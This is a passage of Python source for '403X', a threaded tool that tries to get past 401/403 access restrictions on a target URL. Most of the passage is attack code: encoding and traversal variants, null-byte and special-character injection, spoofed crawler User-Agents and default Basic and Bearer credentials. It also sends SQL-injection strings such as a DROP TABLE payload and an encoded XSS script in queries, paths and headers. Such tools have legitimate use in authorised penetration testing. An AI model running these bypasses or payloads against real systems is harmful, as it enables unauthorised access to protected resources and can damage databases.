        encoding_variations.extend(combos[:30])
    
    futures_map = {}
    for encoding_var in encoding_variations:
        if ctx.path and ctx.path != "/":
            target_path = ctx.path.rstrip('/') + encoding_var
            target_url = f"{base_url}{target_path}"
        else:
            target_url = f"{base_url}{encoding_var}"
        
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = target_url
    
    for future in as_completed(futures_map):
        target_url = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "URL-ENCODING", target_url, 
                        response.status_code, len(response.content))
    
    # Test encoding individual characters
    if ctx.path and ctx.path != "/":
        path_parts = ctx.path.strip('/').split('/')
        char_futures = {}
        
        for i, part in enumerate(path_parts):
            char_limit = len(part) if not ctx.args.fast else min(len(part), 3)
            for char_index in range(1, char_limit):
                # Single encoding
                encoded_char = '%{:02x}'.format(ord(part[char_index]))
                modified_part = part[:char_index] + encoded_char + part[char_index+1:]
                
                new_path_parts = path_parts.copy()
                new_path_parts[i] = modified_part
                new_path = '/' + '/'.join(new_path_parts)
                target_url = f"{base_url}{new_path}"
                
                future = ctx.pool.submit(make_request, ctx, target_url)
                char_futures[future] = (target_url, "single")
                
                # Double encoding
                double_encoded_char = '%25{:02x}'.format(ord(part[char_index]))
                modified_part = part[:char_index] + double_encoded_char + part[char_index+1:]
                
                new_path_parts[i] = modified_part
                new_path = '/' + '/'.join(new_path_parts)
                target_url = f"{base_url}{new_path}"
                
                future = ctx.pool.submit(make_request, ctx, target_url)
                char_futures[future] = (target_url, "double")
        
        for future in as_completed(char_futures):
            target_url, encoding_type = char_futures[future]
            response = future.result()
            if response:
                if encoding_type == "double":
                    report_bypass(ctx, "URL-ENCODING-DOUBLE", target_url, 
                                response.status_code, len(response.content))
                else:
                    report_bypass(ctx, "URL-ENCODING-CHAR", target_url, 
                                response.status_code, len(response.content))

def case_sensitivity_bypass(ctx: BypassContext):
    """Try case variations to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Case Sensitivity Bypasses...{Style.RESET_ALL}")
    
    if not ctx.path or ctx.path == "/":
        ctx.print_safe(f"{Fore.YELLOW}[!] No path to test case sensitivity on.{Style.RESET_ALL}")
        return
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    path_parts = ctx.path.strip('/').split('/')
    
    futures_map = {}
    for part_idx, part in enumerate(path_parts):
        if len(part) <= 1:
            continue
        
        # Uppercase
        upper_part = part.upper()
        if upper_part != part:
            new_path_parts = path_parts.copy()
            new_path_parts[part_idx] = upper_part
            new_path = '/' + '/'.join(new_path_parts)
            target_url = f"{base_url}{new_path}"
            
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "upper")
        
        # Lowercase
        lower_part = part.lower()
        if lower_part != part:
            new_path_parts = path_parts.copy()
            new_path_parts[part_idx] = lower_part
            new_path = '/' + '/'.join(new_path_parts)
            target_url = f"{base_url}{new_path}"
            
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "lower")
        
        # Mixed case
        mixed_part = ''.join([c.upper() if idx % 2 == 0 else c.lower() for idx, c in enumerate(part)])
        if mixed_part != part:
            new_path_parts = path_parts.copy()
            new_path_parts[part_idx] = mixed_part
            new_path = '/' + '/'.join(new_path_parts)
            target_url = f"{base_url}{new_path}"
            
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "mixed")
    
    for future in as_completed(futures_map):
        target_url, case_type = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, f"CASE-{case_type.upper()}", target_url, 
                        response.status_code, len(response.content))

def file_extension_bypass(ctx: BypassContext):
    """Try adding different file extensions to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing File Extension Bypasses...{Style.RESET_ALL}")
    
    extensions = [
        ".json", ".html", ".php", ".asp", ".aspx", ".js", ".txt",
        ".xml", ".api", ".action", ".do", ".jsp", ".env", ".yml",
        ".backup", ".bak", ".swp", ".old", ".~", ".orig", ".new",
        ".log", ".db", ".sql"
    ]
    
    if ctx.args.fast:
        extensions = extensions[:10]
    
    futures_map = {}
    # Add extensions to URL
    for ext in extensions:
        ext_url = ctx.original_url + ext
        future = ctx.pool.submit(make_request, ctx, ext_url)
        futures_map[future] = (ext_url, "add")
    
    # Change existing extension
    if ctx.path and '.' in ctx.path.split('/')[-1]:
        base_path = ctx.path.rsplit('.', 1)[0]
        base_url_no_path = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
        
        for ext in extensions:
            target_url = f"{base_url_no_path}{base_path}{ext}"
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "change")
    
    for future in as_completed(futures_map):
        target_url, bypass_type = futures_map[future]
        response = future.result()
        if response:
            if bypass_type == "change":
                report_bypass(ctx, "FILE-EXTENSION-CHANGE", target_url, 
                            response.status_code, len(response.content))
            else:
                report_bypass(ctx, "FILE-EXTENSION", target_url, 
                            response.status_code, len(response.content))

def parameter_pollution_bypass(ctx: BypassContext):
    """Try parameter pollution techniques to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Parameter Pollution Bypasses...{Style.RESET_ALL}")
    
    params = [
        "debug=true", "test=1", "admin=1", "local=1", "bypass=1",
        "proxy=1", "auth=false", "mode=bypass", "webhook=skip",
        "internal=true", "no_auth=true", "cache=false", "direct=1", "preview=1"
    ]
    
    # Add path-specific parameters
    if ctx.path and ctx.path != "/":
        path_parts = ctx.path.strip('/').split('/')
        for part in path_parts:
            if len(part) > 2:
                params.extend([f"{part}=1", f"show_{part}=1", f"bypass_{part}=1"])
    
    if ctx.args.fast:
        params = params[:10]
    
    futures_map = {}
    # Add parameters
    for param in params:
        if '?' in ctx.original_url:
            param_url = f"{ctx.original_url}&{param}"
        else:
            param_url = f"{ctx.original_url}?{param}"
        
        future = ctx.pool.submit(make_request, ctx, param_url)
        futures_map[future] = (param_url, "param")
    
    # Special characters
    special_chars = ['#', ';', '%00', '%09', '%0d%0a']
    for char in special_chars:
        if '?' in ctx.original_url:
            param_url = f"{ctx.original_url}{char}&bypass=1"
        else:
            param_url = f"{ctx.original_url}{char}?bypass=1"
        
        future = ctx.pool.submit(make_request, ctx, param_url)
        futures_map[future] = (param_url, "special")
    
    for future in as_completed(futures_map):
        param_url, bypass_type = futures_map[future]
        response = future.result()
        if response:
            if bypass_type == "special":
                report_bypass(ctx, "PARAM-SPECIAL-CHAR", param_url, 
                            response.status_code, len(response.content))
            else:
                report_bypass(ctx, "PARAM-POLLUTION", param_url, 
                            response.status_code, len(response.content))

def user_agent_bypass(ctx: BypassContext):
    """Try different User-Agent headers to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing User-Agent Bypasses...{Style.RESET_ALL}")
    
    user_agents = load_resource("user_agents.txt")
    if not user_agents:
        user_agents = [
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "AdsBot-Google (+http://www.google.com/adsbot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
            "PostmanRuntime/7.28.0",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            "Wget/1.21",
            "curl/7.68.0",
            "python-requests/2.25.1",
            "Slack-ImgProxy",
            "Slackbot-LinkExpanding",
            "facebookexternalhit/1.1",
            "Twitterbot/1.0",
            "WhatsApp/2.21.10.16"
        ]
    
    if ctx.args.fast:
        user_agents = user_agents[:12]
    
    futures_map = {}
    for user_agent in user_agents:
        headers = {"User-Agent": user_agent}
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = user_agent
    
    for future in as_completed(futures_map):
        user_agent = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "USER-AGENT", ctx.original_url, 
                        response.status_code, len(response.content), f"User-Agent: {user_agent}")

def auth_bypass(ctx: BypassContext):
    """Try authorization-related bypasses"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Authorization Bypasses...{Style.RESET_ALL}")
    
    # Empty auth headers
    auth_headers = [
        {"Authorization": ""},
        {"Authentication": ""},
        {"Auth": ""},
        {"X-API-Key": ""},
        {"API-Key": ""},
        {"Proxy-Authorization": ""},
        {"Proxy-Authentication": ""}
    ]
    
    # Common auth values
    auth_values = [
        "null", "undefined", "admin", "guest", "anonymous", "public",
        "none", "demo", "test", "root",
        "Basic YWRtaW46YWRtaW4=",  # admin:admin
        "Basic Z3Vlc3Q6Z3Vlc3Q=",   # guest:guest
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "Bearer null",
        "Bearer undefined"
    ]
    
    if ctx.args.fast:
        auth_values = auth_values[:8]
    
    futures_map = {}
    # Test empty headers
    for headers in auth_headers:
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = (headers, "empty")
    
    # Test auth values
    for value in auth_values:
        auth_header_types = [
            {"Authorization": value},
            {"Authentication": value},
            {"Auth": value},
            {"X-API-Key": value},
            {"API-Key": value}
        ]
        
        for headers in auth_header_types:
            future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
            futures_map[future] = (headers, "value")
    
    for future in as_completed(futures_map):
        headers, test_type = futures_map[future]
        response = future.result()
        if response:
            header_name = list(headers.keys())[0]
            header_value = headers[header_name]
            if test_type == "empty":
                report_bypass(ctx, "AUTH-BYPASS", ctx.original_url, 
                            response.status_code, len(response.content), f"{header_name}: (empty)")
            else:
                report_bypass(ctx, "AUTH-VALUE", ctx.original_url, 
                            response.status_code, len(response.content), f"{header_name}: {header_value}")

def dot_slash_bypass(ctx: BypassContext):
    """Try dot-slash variations to bypass path restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Dot-Slash Variations Bypasses...{Style.RESET_ALL}")
    
    if not ctx.path or ctx.path == "/":
        ctx.print_safe(f"{Fore.YELLOW}[!] No significant path to test dot-slash variations on.{Style.RESET_ALL}")
        return
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    variations = [
        "./", "./././", ".%2f", "%2e/", "%2e%2e/", "%2e%2e%2f",
        ".%252f", "%252e/", "%252e%252e/", "%252e%252e%252f",
        "..%c0%af", "%c0%ae%c0%ae/", "%e0%40%ae/", "%c0%ae%e0%80%ae/",
        "%c0%ae%c0%ae%c0%af"
    ]
    
    if ctx.args.fast:
        variations = variations[:8]
    
    path_parts = ctx.path.strip('/').split('/')
    
    futures_map = {}
    for variation in variations:
        # Try at different path levels
        for i in range(len(path_parts) + 1):
            if i == 0:
                target_path = "/" + variation + '/'.join(path_parts)
            elif i == len(path_parts):
                target_path = "/" + '/'.join(path_parts) + "/" + variation
            else:
                target_path = "/" + '/'.join(path_parts[:i]) + "/" + variation + '/'.join(path_parts[i:])
            
            target_url = f"{base_url}{target_path}"
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = target_url
    
    for future in as_completed(futures_map):
        target_url = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "DOT-SLASH", target_url, 
                        response.status_code, len(response.content))

def special_character_bypass(ctx: BypassContext):
    """Try special characters to bypass path restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Special Character Bypasses...{Style.RESET_ALL}")
    
    special_chars = [
        '#', '%', '\\', '?', ';', '*', '~', '[', ']', '@',
        '!', ',', '&', "'", '(', ')', '+', '=', '"', '<', '>',
        '{', '}', '|', '^', '`'
    ]
    
    if ctx.args.fast:
        special_chars = special_chars[:12]
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    futures_map = {}
    for char in special_chars:
        # Add at the end
        target_url = ctx.original_url + char
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = (target_url, "suffix")
        
        # Add before the path
        if ctx.path and ctx.path != "/":
            encoded_char = quote(char)
            target_path = f"/{encoded_char}{ctx.path.lstrip('/')}"
            target_url = f"{base_url}{target_path}"
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "prefix")
    
    for future in as_completed(futures_map):
        target_url, test_type = futures_map[future]
        response = future.result()
        if response:
            if test_type == "prefix":
                report_bypass(ctx, "SPECIAL-CHAR-PREFIX", target_url, 
                            response.status_code, len(response.content))
            else:
                report_bypass(ctx, "SPECIAL-CHAR", target_url, 
                            response.status_code, len(response.content))

def null_byte_bypass(ctx: BypassContext):
    """Try null byte injection to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Null Byte Bypasses...{Style.RESET_ALL}")
    
    null_bytes = [
        "%00", "%0d", "%0a", "%00/", "%0d/", "%0a/",
        "//../%00/", "/%00/", "%2500"
    ]
    
    if ctx.args.fast:
        null_bytes = null_bytes[:5]
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    futures_map = {}
    # Add at the end
    for null_byte in null_bytes:
        target_url = ctx.original_url + null_byte
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = (target_url, "end")
    
    # Add in the middle of path
    if ctx.path and ctx.path != "/" and len(ctx.path) > 1:
        path_parts = ctx.path.strip('/').split('/')
        
        for i in range(len(path_parts)):
            if len(path_parts[i]) > 1:
                mid_point = len(path_parts[i]) // 2
                for null_byte in null_bytes[:3]:
                    modified_part = path_parts[i][:mid_point] + null_byte + path_parts[i][mid_point:]
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = modified_part
                    target_path = '/' + '/'.join(new_path_parts)
                    target_url = f"{base_url}{target_path}"
                    
                    future = ctx.pool.submit(make_request, ctx, target_url)
                    futures_map[future] = (target_url, "mid")
            
            # Between segments
            if i < len(path_parts) - 1:
                for null_byte in null_bytes[:3]:
                    new_path = '/' + '/'.join(path_parts[:i+1]) + null_byte + '/' + '/'.join(path_parts[i+1:])
                    target_url = f"{base_url}{new_path}"
                    
                    future = ctx.pool.submit(make_request, ctx, target_url)
                    futures_map[future] = (target_url, "segment")
    
    for future in as_completed(futures_map):
        target_url, test_type = futures_map[future]
        response = future.result()
        if response:
            if test_type == "mid":
                report_bypass(ctx, "NULL-BYTE-MID", target_url, 
                            response.status_code, len(response.content))
            elif test_type == "segment":
                report_bypass(ctx, "NULL-BYTE-SEGMENT", target_url, 
                            response.status_code, len(response.content))
            else:
                report_bypass(ctx, "NULL-BYTE", target_url, 
                            response.status_code, len(response.content))

def payload_injection_bypass(ctx: BypassContext):
    """Try injecting special payloads to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Payload Injection Bypasses...{Style.RESET_ALL}")
    
    payloads = load_resource("payloads.txt")
    if not payloads:
        payloads = [
            "' or 1=1--", "' or '1'='1", "1.e(\")", "1.e(ascii",
            "1.e(substring(", "1; DROP TABLE users", "' UNION SELECT 1,2,3--",
            "admin'--", "1' or 1.e(ascii 1.e)='",
            "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
            "data:,admin", "javascript:void(0)"
        ]
    
    if ctx.args.fast:
        payloads = payloads[:8]
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    futures_map = {}
    for payload in payloads:
        # As query parameter
        if '?' in ctx.original_url:
            target_url = f"{ctx.original_url}&q={quote(payload)}"
        else:
            target_url = f"{ctx.original_url}?q={quote(payload)}"
        
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = (target_url, "query", payload)
        
        # In path
        if ctx.path and ctx.path != "/":
            target_url = f"{base_url}{ctx.path}/{quote(payload)}"
        else:
            target_url = f"{base_url}/{quote(payload)}"
        
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = (target_url, "path", payload)
        
        # In header
        headers = {"X-Payload": payload}
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = (ctx.original_url, "header", payload)
        
        # In Authorization
        headers = {"Authorization": f"Bearer {payload}"}
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = (ctx.original_url, "auth", payload)
    
    for future in as_completed(futures_map):
        target_url, test_type, payload = futures_map[future]
        response = future.result()
        if response:
            if test_type == "query":
                report_bypass(ctx, "PAYLOAD-QUERY", target_url, 
                            response.status_code, len(response.content), f"?q={payload}")
            elif test_type == "path":
                report_bypass(ctx, "PAYLOAD-PATH", target_url, 
                            response.status_code, len(response.content), f"/{payload}")
            elif test_type == "header":
                report_bypass(ctx, "PAYLOAD-HEADER", target_url, 
                            response.status_code, len(response.content), f"X-Payload: {payload}")
            elif test_type == "auth":
                report_bypass(ctx, "PAYLOAD-AUTH", target_url, 
                            response.status_code, len(response.content), f"Authorization: Bearer {payload}")

def cache_bypass(ctx: BypassContext):
    """Try cache-related headers to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Cache Bypasses...{Style.RESET_ALL}")
    
    cache_headers = [
        {"Cache-Control": "no-cache"},
        {"Cache-Control": "no-store"},
        {"Cache-Control": "max-age=0"},
        {"Cache-Control": "must-revalidate"},
        {"Pragma": "no-cache"},
        {"Expires": "-1"},
        {"If-None-Match": "*"},
        {"If-Modified-Since": "Thu, 1 Jan 1970 00:00:00 GMT"},
        {"X-Cache-Bypass": "1"},
        {"X-Cache-Control": "bypass"},
        {"Cache-Control": "max-age=0, no-cache, no-store, must-revalidate"},
        {"Clear-Site-Data": "\"cache\""}
    ]
    
    if ctx.args.fast:
        cache_headers = cache_headers[:8]
    
    futures_map = {}
    for headers in cache_headers:
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = headers
    
    for future in as_completed(futures_map):
        headers = futures_map[future]
        response = future.result()
        if response:
            header_name = list(headers.keys())[0]
            header_value = headers[header_name]
            report_bypass(ctx, "CACHE", ctx.original_url, 
                        response.status_code, len(response.content), f"{header_name}: {header_value}")

def fuzzing_bypass(ctx: BypassContext):
    """Try various fuzzing techniques to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Fuzzing Bypasses...{Style.RESET_ALL}")
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    mutations = [
        ("%20", " "), ("%09", "\t"), ("%0d", "\r"), ("%0a", "\n"),
        ("%0d%0a", "\r\n"), ("%00", "\0"), ("%2e", "."), ("%2f", "/"),
        ("%5c", "\\"), ("%25", "%"), ("%3b", ";"), ("%26", "&"),
        ("%3d", "="), ("%3f", "?"), ("%23", "#"), ("%40", "@"),
        ("%7e", "~"), ("%60", "`"), ("%7c", "|"), ("%5e", "^"),
        ("%7b", "{"), ("%7d", "}"), ("%5b", "["), ("%5d", "]"),
        ("%3c", "<"), ("%3e", ">"), ("%22", "\""), ("%27", "'"),
        ("%2b", "+"), ("%2c", ","), ("%3a", ":")
    ]
    
    if ctx.args.fast:
        mutations = mutations[:15]
    
    if ctx.path and ctx.path != "/":
        path_parts = ctx.path.strip('/').split('/')
        
        futures_map = {}
        for i, part in enumerate(path_parts):
            if len(part) <= 1:
                continue
            
            # Insert mutations
            for mutation, original in mutations:
                insert_limit = len(part) if not ctx.args.fast else min(len(part), 3)
                for j in range(1, insert_limit):
                    mutated_part = part[:j] + mutation + part[j:]
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = mutated_part
                    
                    new_path = '/' + '/'.join(new_path_parts)
                    target_url = f"{base_url}{new_path}"
                    
                    future = ctx.pool.submit(make_request, ctx, target_url)
                    futures_map[future] = (target_url, "insert")
            
            # Repeat segments
            repeated_part = part + "/" + part
            new_path_parts = path_parts.copy()
            new_path_parts[i] = repeated_part
            
            new_path = '/' + '/'.join(new_path_parts)
            target_url = f"{base_url}{new_path}"
            
            future = ctx.pool.submit(make_request, ctx, target_url)
            futures_map[future] = (target_url, "repeat")
        
        # Limit results to avoid overwhelming output
        count = 0
        for future in as_completed(futures_map):
            if count >= 50:
                break
            target_url, test_type = futures_map[future]
            response = future.result()
            if response:
                if test_type == "repeat":
                    report_bypass(ctx, "FUZZING-REPEAT", target_url, 
                                response.status_code, len(response.content))
                else:
                    report_bypass(ctx, "FUZZING-INSERT", target_url, 
                                response.status_code, len(response.content))
                count += 1

def content_type_bypass(ctx: BypassContext):
    """Try different Content-Type headers to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Content-Type Bypasses...{Style.RESET_ALL}")
    
    content_types = [
        "application/json", "application/xml", "application/x-www-form-urlencoded",
        "multipart/form-data", "text/html", "text/plain", "application/javascript",
        "application/octet-stream", "application/soap+xml", "application/graphql",
        "application/vnd.api+json"
    ]
    
    if ctx.args.fast:
        content_types = content_types[:6]
    
    futures_map = {}
    for content_type in content_types:
        headers = {"Content-Type": content_type}
        
        # GET request
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = (content_type, "GET", None)
        
        # POST request
        data = "{}" if "json" in content_type else "data=test"
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, "POST", headers, True, ctx.args.timeout, data)
        futures_map[future] = (content_type, "POST", data)
    
    for future in as_completed(futures_map):
        content_type, method, data = futures_map[future]
        response = future.result()
        if response:
            if method == "POST":
                report_bypass(ctx, "CONTENT-TYPE-POST", ctx.original_url, 
                            response.status_code, len(response.content), 
                            f"Content-Type: {content_type}, Method: POST")
            else:
                report_bypass(ctx, "CONTENT-TYPE-GET", ctx.original_url, 
                            response.status_code, len(response.content), 
                            f"Content-Type: {content_type}")

def endpath_suffix_bypass(ctx: BypassContext):
    """Append classic end-path payloads after the protected resource"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing End-Path Suffixes...{Style.RESET_ALL}")
    
    suffixes = load_resource("endpaths.txt")
    
    if not suffixes:
        suffixes = [
            "/", "//", "/.", "/./", "/..;/", "..;/",
            "%00", "%2500", "%09", "%0A", "%0D", "%20", "%20/", "%2520",
            "%2520%252F", "%23", "%2523", "%26", "%2526", "%3f", "%253F",
            "?", "??", "???", "?WSDL", "?debug=1", "?debug=true",
            "?param", "?testparam",
            ".json", ".html", ".php", ".css", ".svc", ".svc?wsdl",
            ".wsdl", ".random",
            "°/", "#", "#/", "#/./", "%25", "%2525", "%61", "%2561",
            "&", "-", ".", "~", "//", "\\/\\/", "/;", "%2f..%2f..%2f",
            "/*", "/%2e", "/%2f", "/%ef%bc%8f", "/..%3B/", ";%2f..%2f",
            "debug", "false", "null", "true"
        ]
    
    if ctx.args.fast:
        suffixes = suffixes[:25]
    
    base = ctx.original_url.split("?", 1)[0].rstrip("/")
    
    futures_map = {}
    for suf in suffixes:
        target = base + suf
        future = ctx.pool.submit(make_request, ctx, target)
        futures_map[future] = (target, suf)
    
    for future in as_completed(futures_map):
        target, suf = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "ENDPATH", target, 
                        response.status_code, len(response.content), suf)

# ---------------- MAIN FUNCTIONS -----------------

def run_all_bypasses(ctx: BypassContext):
    """Run all bypass techniques"""
    http_method_bypass(ctx)
    protocol_version_bypass(ctx)
    http_header_bypass(ctx)
    advanced_path_manipulation(ctx)
    exhaustive_case_permutation(ctx)
    double_url_encoding_sweep(ctx)
    protocol_scheme_bypass(ctx)
    port_bypass(ctx)
    path_traversal_bypass(ctx)
    endpath_suffix_bypass(ctx)
    url_encoding_bypass(ctx)
    case_sensitivity_bypass(ctx)
    file_extension_bypass(ctx)
    parameter_pollution_bypass(ctx)
    user_agent_bypass(ctx)
    auth_bypass(ctx)
    dot_slash_bypass(ctx)
    special_character_bypass(ctx)
    null_byte_bypass(ctx)
    payload_injection_bypass(ctx)
    cache_bypass(ctx)
    fuzzing_bypass(ctx)
    content_type_bypass(ctx)

def main():
    parser = argparse.ArgumentParser(
        description="403X – Enhanced tool to bypass 401/403 restrictions")
    
    # Arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-a", "--all", action="store_true", help="Run all bypass techniques")
    parser.add_argument("-m", "--methods", action="store_true", help="Test HTTP methods")
    parser.add_argument("-H", "--headers", action="store_true", help="Test HTTP headers")
    parser.add_argument("-P", "--protocols", action="store_true", help="Test protocol schemes")
    parser.add_argument("-p", "--ports", action="store_true", help="Test port bypasses")
    parser.add_argument("-t", "--paths", action="store_true", help="Test path traversal")
    parser.add_argument("-e", "--encoding", action="store_true", help="Test URL encoding")
    parser.add_argument("-c", "--case", action="store_true", help="Test case sensitivity")
    parser.add_argument("-x", "--extensions", action="store_true", help="Test file extensions")
    parser.add_argument("-q", "--params", action="store_true", help="Test parameter pollution")
    parser.add_argument("-U", "--user-agents", action="store_true", help="Test user agents")
    parser.add_argument("-A", "--auth", action="store_true", help="Test authorization bypasses")
    parser.add_argument("-d", "--dot-slash", action="store_true", help="Test dot-slash variations")
    parser.add_argument("-s", "--special-chars", action="store_true", help="Test special characters")
    parser.add_argument("-n", "--null-byte", action="store_true", help="Test null byte injection")
    parser.add_argument("-i", "--injection", action="store_true", help="Test payload injection")
    parser.add_argument("-C", "--cache", action="store_true", help="Test cache bypasses")
    parser.add_argument("-f", "--fuzzing", action="store_true", help="Test fuzzing techniques")
    parser.add_argument("-y", "--content-type", action="store_true", help="Test content types")
    
    # Enhanced techniques
    parser.add_argument("--advanced-path", action="store_true", help="Advanced path manipulation")
    parser.add_argument("--exhaustive-case", action="store_true", help="Exhaustive case permutations")
    parser.add_argument("--double-encoding", action="store_true", help="Double URL encoding")
    parser.add_argument("--protocol-version", action="store_true", help="Protocol version bypasses")
    parser.add_argument("-E", "--endpaths", action="store_true", help="Test end-path suffix bypasses")
    
    # Options
    parser.add_argument("--fast", action="store_true", help="Reduce test variations for speed")
    parser.add_argument("-T", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-k", "--continue-if-ok", action="store_true", help="Continue if target returns 200")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    
    args = parser.parse_args()
    
    banner()
    
    # Prepare URL
    original_url = args.url if args.url.startswith(("http://", "https://")) else "http://" + args.url
    parsed_url = urlparse(original_url)
    domain = parsed_url.netloc
    path = parsed_url.path
    is_https = parsed_url.scheme == "https"
    
    # Extract hostname and port
    if ":" in domain and not domain.startswith("["):  # Not IPv6
        hostname, port = domain.rsplit(":", 1)
    else:
        hostname, port = domain, None
    
    # Create context with global thread pool
    ctx = BypassContext(
        original_url=original_url,
        parsed_url=parsed_url,
        domain=domain,
        path=path,
        is_https=is_https,
        args=args,
        session=create_session(),
        pool=ThreadPoolExecutor(max_workers=args.threads)
    )
    
    # Print target info
    print(f"{Fore.YELLOW}[*] Target:   {original_url}")
    print(f"{Fore.YELLOW}[*] Domain:   {domain}")
    if port:
        print(f"{Fore.YELLOW}[*] Port:     {port}")
    print(f"{Fore.YELLOW}[*] Path:     {path or '/'}")
    print(f"{Fore.YELLOW}[*] Threads:  {args.threads}")
    if args.fast:
        print(f"{Fore.YELLOW}[*] Fast Mode: Enabled (reduced test variations)")
    print(f"{Style.RESET_ALL}")
    
    # DNS check
    print(f"{Fore.YELLOW}[*] Testing DNS resolution for {hostname}…{Style.RESET_ALL}")
    if not test_dns_resolution(hostname):
        print(f"{Fore.RED}[!] Cannot resolve hostname – aborting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # If no specific test selected, run all
    if not any([
        args.all, args.methods, args.headers, args.protocols, args.ports,
        args.paths, args.encoding, args.case, args.extensions, args.params,
        args.user_agents, args.auth, args.dot_slash, args.special_chars,
        args.null_byte, args.injection, args.cache, args.fuzzing,
        args.content_type, args.advanced_path, args.exhaustive_case,
        args.double_encoding, args.protocol_version, args.endpaths
    ]):
        args.all = True
    
    # Test baseline
    test_baseline(ctx)
    
    # Run selected tests
    if args.all:
        run_all_bypasses(ctx)
    else:
        if args.methods: http_method_bypass(ctx)
        if args.protocol_version: protocol_version_bypass(ctx)
        if args.headers: http_header_bypass(ctx)
        if args.advanced_path: advanced_path_manipulation(ctx)
        if args.exhaustive_case: exhaustive_case_permutation(ctx)
